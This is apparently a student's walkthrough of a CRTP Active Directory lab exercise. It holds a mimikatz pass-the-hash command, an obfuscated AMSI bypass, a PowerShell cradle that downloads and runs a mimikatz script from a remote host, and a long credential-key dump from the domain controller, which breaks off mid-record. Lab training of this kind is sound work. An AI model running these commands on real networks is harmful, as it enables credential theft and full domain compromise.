CRTP: Hands-On 8

```
  • Extract secrets from the domain controller of dollarcorp.
  • Using the secrets of krbtgt account, create a Golden ticket.
  • Use the Golden ticket to (once again) get domain admin privileges from a machine.
```

Index:

  1. [Dump Secrets DC](#dump-secrets-dc)
  2. [Using Secrets for Golden Ticket](#using-secrets-for-golden-ticket)
  3. [Golden Ticket DA privileges](#golden-ticket-da-privileges)


## Dump Secrets DC

Impersonate svcadmin :
```
C:\AD\Tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:dollarcorp.moneycorp.local /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd" "exit"
```
Access to domain controller dcorp-dc:
```
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\Windows\system32> Enter-PSSession -ComputerName dcorp-dc
[dcorp-dc]: PS C:\Users\svcadmin\Documents> whoami
dcorp\svcadmin
[dcorp-dc]: PS C:\Users\svcadmin\Documents> hostname
dcorp-dc
[dcorp-dc]: PS C:\Users\svcadmin\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::20f3:6a81:3eb4:45cb%9
   IPv4 Address. . . . . . . . . . . : 172.16.2.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.2.254
```
Dump Credentials:

```
[dcorp-dc]: PS C:\Users\svcadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
[dcorp-dc]: PS C:\Users\svcadmin\Documents> IEX (New-Object Net.webclient).DownloadString("http://172.16.100.162/Invoke-MimiEx.ps1")

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::ekeys

Authentication Id : 0 ; 9512962 (00000000:00912802)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 5/1/2023 12:07:41 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 9483622 (00000000:0090b566)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 5/1/2023 12:06:41 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 9281395 (00000000:008d9f73)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 5/1/2023 12:01:41 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 9266820 (00000000:008d6684)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 5/1/2023 12:00:41 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 9236436 (00000000:008cefd4)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 4/30/2023 11:58:41 PM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 432275 (00000000:00069893)
Session           : RemoteInteractive from 3
User Name         : administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/28/2023 3:56:17 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 246627 (00000000:0003c363)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/28/2023 3:51:39 AM
SID               : S-1-5-90-0-3

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 89 72 8c 3c 64 e4 e5 1c d8 64 23 3b a3 09 a9 d8 fc dc e1 f4 b4 6c 7b 11 46 72 9d e8 3b 11 98 63 ff d8 52 c6 00 9c dd 7f 66 8c d9 ec 57 49 d7 a2 b4 42 09 bd f7 20 ae d3 25 86 17 05 95 15 8e 34 26 34 0b 4b 13 ce 96 c3 cd e4 ae 82 89 2a b6 60 69 ab 3d 6e bc bb 5c bc 01 29 7e f1 17 de 1d 95 91 b6 de dc 48 5d ff 11 b6 e9 16 e5 59 9e 94 f2 10 77 1f 38 2d 8e 24 84 01 d4 f6 e2 ed b3 23 80 e8 80 05 5b 70 fb ce 3f 4e 5e 10 47 a6 fb 5a 95 00 28 72 d8 18 5a 9a 57 1e 22 99 2d 73 80 a1 cd ed f1 be 23 c9 49 dd 99 65 08 98 85 68 16 7b 15 6c 8f 4c ef 60 fe 6a 3a 97 df d1 5a fd 6a 1a ac 7f 24 79 05 b9 4c 31 5b 8d f0 a0 5d f5 0d f3 b8 20 03 31 1a ff 54 f4 24 5e 98 67 c5 3f 56 cb 3a 2f 6b 1b 86 5d c1 26 a7 86 0e 84 79 bb 02 fb f4
         * Key List :
           aes256_hmac       f33de71c7c74968585b0375bd98c0454dd44cdc37042015f1b6249ca0204b33d
           aes128_hmac       1cc05973fcc2001d1912ad6e9be6f6f3
           rc4_hmac_nt       3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old      3f1d534265c06e36e88ea00f34251c98
           rc4_md4           3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_nt_exp   3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old_exp  3f1d534265c06e36e88ea00f34251c98

Authentication Id : 0 ; 246147 (00000000:0003c183)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/28/2023 3:51:38 AM
SID               : S-1-5-90-0-3

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
         * Password : bd d5 15 ad 8e 0f 22 ae 78 ff a6 56 d8 11 04 52 c0 f5 c0 6d 2c c1 ab 97 a4 9f c9 00 50 4c 85 f7 22 e1 8a 1e 81 88 db 9a cb 42 e7 ec 37 fe e1 da 96 d5 0e 3a b2 e5 f0 3d 80 4a 4e 51 5c fd 11 f5 aa cd 3a c0 b9 be 6e ee 83 e0 79 75 25 39 a2 14 97 9c f3 dc 16 7f 7e 90 a1 3a 30 1e 37 87 50 3b e7 10 4a d7 d8 6f 51 e5 42 7c fa b6 07 ae c1 05 ff 77 23 c9 1f c7 65 24 96 f4 eb 68 f5 b6 72 f2 36 8e 82 95 91 c5 bb 57 10 76 f3 16 f5 0d 8e c5 be b1 7f e6 d2 f0 25 38 0d 28 14 ae 1a fb bd cd 2f a9 5a 1b 53 2e ea 92 2f 3b 22 2d 44 eb 29 a3 bc 2f f3 6b c6 3b 80 36 82 cf 37 4b 6f 3b aa 3b f9 6c 9b b3 88 57 af bf af b4 e7 26 17 2b a7 8b ca eb 29 e1 74 8e 8d 71 53 53 a6 f1 67 46 84 e9 58 14 d0 ca 1c df 78 4c a9 95 db c2 d1 75 0f 02
         * Key List :
           aes256_hmac       2a1e526dbb56ff91c62528d11d182f42ed6017a1af57a5daf01d2052c9da7a0a
           aes128_hmac       417204a7aa308dc8096f57b27026ce87
           rc4_hmac_nt       9407a301944bf60d059322952f56718a
           rc4_hmac_old      9407a301944bf60d059322952f56718a
           rc4_md4           9407a301944bf60d059322952f56718a
           rc4_hmac_nt_exp   9407a301944bf60d059322952f56718a
           rc4_hmac_old_exp  9407a301944bf60d059322952f56718a

Authentication Id : 0 ; 245304 (00000000:0003be38)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:51:38 AM
SID               : S-1-5-96-0-3

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
         * Password : bd d5 15 ad 8e 0f 22 ae 78 ff a6 56 d8 11 04 52 c0 f5 c0 6d 2c c1 ab 97 a4 9f c9 00 50 4c 85 f7 22 e1 8a 1e 81 88 db 9a cb 42 e7 ec 37 fe e1 da 96 d5 0e 3a b2 e5 f0 3d 80 4a 4e 51 5c fd 11 f5 aa cd 3a c0 b9 be 6e ee 83 e0 79 75 25 39 a2 14 97 9c f3 dc 16 7f 7e 90 a1 3a 30 1e 37 87 50 3b e7 10 4a d7 d8 6f 51 e5 42 7c fa b6 07 ae c1 05 ff 77 23 c9 1f c7 65 24 96 f4 eb 68 f5 b6 72 f2 36 8e 82 95 91 c5 bb 57 10 76 f3 16 f5 0d 8e c5 be b1 7f e6 d2 f0 25 38 0d 28 14 ae 1a fb bd cd 2f a9 5a 1b 53 2e ea 92 2f 3b 22 2d 44 eb 29 a3 bc 2f f3 6b c6 3b 80 36 82 cf 37 4b 6f 3b aa 3b f9 6c 9b b3 88 57 af bf af b4 e7 26 17 2b a7 8b ca eb 29 e1 74 8e 8d 71 53 53 a6 f1 67 46 84 e9 58 14 d0 ca 1c df 78 4c a9 95 db c2 d1 75 0f 02
         * Key List :
           aes256_hmac       2a1e526dbb56ff91c62528d11d182f42ed6017a1af57a5daf01d2052c9da7a0a
           aes128_hmac       417204a7aa308dc8096f57b27026ce87
           rc4_hmac_nt       9407a301944bf60d059322952f56718a
           rc4_hmac_old      9407a301944bf60d059322952f56718a
           rc4_md4           9407a301944bf60d059322952f56718a
           rc4_hmac_nt_exp   9407a301944bf60d059322952f56718a
           rc4_hmac_old_exp  9407a301944bf60d059322952f56718a

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-DC$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 3/28/2023 3:50:57 AM
SID               : S-1-5-20

         * Username : dcorp-dc$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e31b09b77c710924a116018b6513d6ed9938b86b0ae810c63b65965cf5a5afcc
           rc4_hmac_nt       9407a301944bf60d059322952f56718a
           rc4_hmac_old      9407a301944bf60d059322952f56718a
           rc4_md4           9407a301944bf60d059322952f56718a
           rc4_hmac_nt_exp   9407a301944bf60d059322952f56718a
           rc4_hmac_old_exp  9407a301944bf60d059322952f56718a

Authentication Id : 0 ; 26703 (00000000:0000684f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:50:57 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 89 72 8c 3c 64 e4 e5 1c d8 64 23 3b a3 09 a9 d8 fc dc e1 f4 b4 6c 7b 11 46 72 9d e8 3b 11 98 63 ff d8 52 c6 00 9c dd 7f 66 8c d9 ec 57 49 d7 a2 b4 42 09 bd f7 20 ae d3 25 86 17 05 95 15 8e 34 26 34 0b 4b 13 ce 96 c3 cd e4 ae 82 89 2a b6 60 69 ab 3d 6e bc bb 5c bc 01 29 7e f1 17 de 1d 95 91 b6 de dc 48 5d ff 11 b6 e9 16 e5 59 9e 94 f2 10 77 1f 38 2d 8e 24 84 01 d4 f6 e2 ed b3 23 80 e8 80 05 5b 70 fb ce 3f 4e 5e 10 47 a6 fb 5a 95 00 28 72 d8 18 5a 9a 57 1e 22 99 2d 73 80 a1 cd ed f1 be 23 c9 49 dd 99 65 08 98 85 68 16 7b 15 6c 8f 4c ef 60 fe 6a 3a 97 df d1 5a fd 6a 1a ac 7f 24 79 05 b9 4c 31 5b 8d f0 a0 5d f5 0d f3 b8 20 03 31 1a ff 54 f4 24 5e 98 67 c5 3f 56 cb 3a 2f 6b 1b 86 5d c1 26 a7 86 0e 84 79 bb 02 fb f4
         * Key List :
           aes256_hmac       f33de71c7c74968585b0375bd98c0454dd44cdc37042015f1b6249ca0204b33d
           aes128_hmac       1cc05973fcc2001d1912ad6e9be6f6f3
           rc4_hmac_nt       3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old      3f1d534265c06e36e88ea00f34251c98
           rc4_md4           3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_nt_exp   3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old_exp  3f1d534265c06e36e88ea00f34251c98

Authentication Id : 0 ; 26687 (00000000:0000683f)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:50:57 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 89 72 8c 3c 64 e4 e5 1c d8 64 23 3b a3 09 a9 d8 fc dc e1 f4 b4 6c 7b 11 46 72 9d e8 3b 11 98 63 ff d8 52 c6 00 9c dd 7f 66 8c d9 ec 57 49 d7 a2 b4 42 09 bd f7 20 ae d3 25 86 17 05 95 15 8e 34 26 34 0b 4b 13 ce 96 c3 cd e4 ae 82 89 2a b6 60 69 ab 3d 6e bc bb 5c bc 01 29 7e f1 17 de 1d 95 91 b6 de dc 48 5d ff 11 b6 e9 16 e5 59 9e 94 f2 10 77 1f 38 2d 8e 24 84 01 d4 f6 e2 ed b3 23 80 e8 80 05 5b 70 fb ce 3f 4e 5e 10 47 a6 fb 5a 95 00 28 72 d8 18 5a 9a 57 1e 22 99 2d 73 80 a1 cd ed f1 be 23 c9 49 dd 99 65 08 98 85 68 16 7b 15 6c 8f 4c ef 60 fe 6a 3a 97 df d1 5a fd 6a 1a ac 7f 24 79 05 b9 4c 31 5b 8d f0 a0 5d f5 0d f3 b8 20 03 31 1a ff 54 f4 24 5e 98 67 c5 3f 56 cb 3a 2f 6b 1b 86 5d c1 26 a7 86 0e 84 79 bb 02 fb f4
         * Key List :
           aes256_hmac       f33de71c7c74968585b0375bd98c0454dd44cdc37042015f1b6249ca0204b33d
           aes128_hmac       1cc05973fcc2001d1912ad6e9be6f6f3
           rc4_hmac_nt       3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old      3f1d534265c06e36e88ea00f34251c98
           rc4_md4           3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_nt_exp   3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old_exp  3f1d534265c06e36e88ea00f34251c98

Authentication Id : 0 ; 9467980 (00000000:0090784c)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 5/1/2023 12:05:41 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 9454312 (00000000:009042e8)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 5/1/2023 12:04:41 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 9309946 (00000000:008e0efa)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 5/1/2023 12:03:41 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 9295607 (00000000:008dd6f7)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 5/1/2023 12:02:41 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 9252533 (00000000:008d2eb5)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 4/30/2023 11:59:41 PM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 5312504 (00000000:00510ff8)
Session           : Batch from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 4/30/2023 9:00:54 PM
SID               : S-1-5-21-719815819-3726368948-3917688648-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
           rc4_hmac_nt       af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old      af0686cc0ca8f04df42210c9ac980760
           rc4_md4           af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_nt_exp   af0686cc0ca8f04df42210c9ac980760
           rc4_hmac_old_exp  af0686cc0ca8f04df42210c9ac980760

Authentication Id : 0 ; 245393 (00000000:0003be91)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:51:38 AM
SID               : S-1-5-96-0-3

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 89 72 8c 3c 64 e4 e5 1c d8 64 23 3b a3 09 a9 d8 fc dc e1 f4 b4 6c 7b 11 46 72 9d e8 3b 11 98 63 ff d8 52 c6 00 9c dd 7f 66 8c d9 ec 57 49 d7 a2 b4 42 09 bd f7 20 ae d3 25 86 17 05 95 15 8e 34 26 34 0b 4b 13 ce 96 c3 cd e4 ae 82 89 2a b6 60 69 ab 3d 6e bc bb 5c bc 01 29 7e f1 17 de 1d 95 91 b6 de dc 48 5d ff 11 b6 e9 16 e5 59 9e 94 f2 10 77 1f 38 2d 8e 24 84 01 d4 f6 e2 ed b3 23 80 e8 80 05 5b 70 fb ce 3f 4e 5e 10 47 a6 fb 5a 95 00 28 72 d8 18 5a 9a 57 1e 22 99 2d 73 80 a1 cd ed f1 be 23 c9 49 dd 99 65 08 98 85 68 16 7b 15 6c 8f 4c ef 60 fe 6a 3a 97 df d1 5a fd 6a 1a ac 7f 24 79 05 b9 4c 31 5b 8d f0 a0 5d f5 0d f3 b8 20 03 31 1a ff 54 f4 24 5e 98 67 c5 3f 56 cb 3a 2f 6b 1b 86 5d c1 26 a7 86 0e 84 79 bb 02 fb f4
         * Key List :
           aes256_hmac       f33de71c7c74968585b0375bd98c0454dd44cdc37042015f1b6249ca0204b33d
           aes128_hmac       1cc05973fcc2001d1912ad6e9be6f6f3
           rc4_hmac_nt       3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old      3f1d534265c06e36e88ea00f34251c98
           rc4_md4           3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_nt_exp   3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old_exp  3f1d534265c06e36e88ea00f34251c98

Authentication Id : 0 ; 43748 (00000000:0000aae4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/28/2023 3:50:58 AM
SID               : S-1-5-90-0-1

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 89 72 8c 3c 64 e4 e5 1c d8 64 23 3b a3 09 a9 d8 fc dc e1 f4 b4 6c 7b 11 46 72 9d e8 3b 11 98 63 ff d8 52 c6 00 9c dd 7f 66 8c d9 ec 57 49 d7 a2 b4 42 09 bd f7 20 ae d3 25 86 17 05 95 15 8e 34 26 34 0b 4b 13 ce 96 c3 cd e4 ae 82 89 2a b6 60 69 ab 3d 6e bc bb 5c bc 01 29 7e f1 17 de 1d 95 91 b6 de dc 48 5d ff 11 b6 e9 16 e5 59 9e 94 f2 10 77 1f 38 2d 8e 24 84 01 d4 f6 e2 ed b3 23 80 e8 80 05 5b 70 fb ce 3f 4e 5e 10 47 a6 fb 5a 95 00 28 72 d8 18 5a 9a 57 1e 22 99 2d 73 80 a1 cd ed f1 be 23 c9 49 dd 99 65 08 98 85 68 16 7b 15 6c 8f 4c ef 60 fe 6a 3a 97 df d1 5a fd 6a 1a ac 7f 24 79 05 b9 4c 31 5b 8d f0 a0 5d f5 0d f3 b8 20 03 31 1a ff 54 f4 24 5e 98 67 c5 3f 56 cb 3a 2f 6b 1b 86 5d c1 26 a7 86 0e 84 79 bb 02 fb f4
         * Key List :
           aes256_hmac       f33de71c7c74968585b0375bd98c0454dd44cdc37042015f1b6249ca0204b33d
           aes128_hmac       1cc05973fcc2001d1912ad6e9be6f6f3
           rc4_hmac_nt       3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old      3f1d534265c06e36e88ea00f34251c98
           rc4_md4           3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_nt_exp   3f1d534265c06e36e88ea00f34251c98
           rc4_hmac_old_exp  3f1d534265c06e36e88ea00f34251c98

Authentication Id : 0 ; 43718 (00000000:0000aac6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/28/2023 3:50:58 AM
SID               : S-1-5-90-0-1

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
         * Password : bd d5 15 ad 8e 0f 22 ae 78 ff a6 56 d8 11 04 52 c0 f5 c0 6d 2c c1 ab 97 a4 9f c9 00 50 4c 85 f7 22 e1 8a 1e 81 88 db 9a cb 42 e7 ec 37 fe e1 da 96 d5 0e 3a b2 e5 f0 3d 80 4a 4e 51 5c fd 11 f5 aa cd 3a c0 b9 be 6e ee 83 e0 79 75 25 39 a2 14 97 9c f3 dc 16 7f 7e 90 a1 3a 30 1e 37 87 50 3b e7 10 4a d7 d8 6f 51 e5 42 7c fa b6 07 ae c1 05 ff 77 23 c9 1f c7 65 24 96 f4 eb 68 f5 b6 72 f2 36 8e 82 95 91 c5 bb 57 10 76 f3 16 f5 0d 8e c5 be b1 7f e6 d2 f0 25 38 0d 28 14 ae 1a fb bd cd 2f a9 5a 1b 53 2e ea 92 2f 3b 22 2d 44 eb 29 a3 bc 2f f3 6b c6 3b 80 36 82 cf 37 4b 6f 3b aa 3b f9 6c 9b b3 88 57 af bf af b4 e7 26 17 2b a7 8b ca eb 29 e1 74 8e 8d 71 53 53 a6 f1 67 46 84 e9 58 14 d0 ca 1c df 78 4c a9 95 db c2 d1 75 0f 02
         * Key List :
           aes256_hmac       2a1e526dbb56ff91c62528d11d182f42ed6017a1af57a5daf01d2052c9da7a0a
           aes128_hmac       417204a7aa308dc8096f57b27026ce87
           rc4_hmac_nt       9407a301944bf60d059322952f56718a
           rc4_hmac_old      9407a301944bf60d059322952f56718a
           rc4_md4           9407a301944bf60d059322952f56718a
           rc4_hmac_nt_exp   9407a301944bf60d059322952f56718a
           rc4_hmac_old_exp  9407a301944bf60d059322952f56718a

Authentication Id : 0 ; 26529 (00000000:000067a1)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:50:57 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
